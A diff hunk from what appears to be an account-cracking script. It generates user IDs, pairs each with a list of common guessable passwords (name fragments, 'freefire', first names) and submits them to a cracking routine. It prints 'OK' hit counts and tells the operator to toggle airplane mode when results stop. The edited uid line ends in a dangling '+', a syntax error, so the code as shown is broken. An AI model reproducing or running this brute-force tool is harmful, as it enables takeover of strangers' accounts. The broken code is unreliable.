@@ -148,8 +148,8 @@ def MUHIBrndm():
         print('\033[1;37m[\033[1;32m×\033[1;37m] \033[1;32mIF NO RESULT\033[1;97m[\033[1;91mON\033[1;97m/\033[1;91mOFF\033[1;97m]\033[1;92mAIRPLANE MODE ')
         __muhib__('\033[38;5;46m--------------------------------------------')
         for guru in user:
-            uid = tithie+tithiex+tithi+guru+kode
-            pwx = [tithie+tithiex+tithi+guru,kode+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
+            uid = tithie+tithiex+tithi+guru+
+            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
             MUHIB.submit(rcrack1,uid,pwx,tl)
     print(f'{G}--------------------------------------')
     print(' [×] FINISHED ------\033[1;92mTOTAL OK : %s'%len(oks))
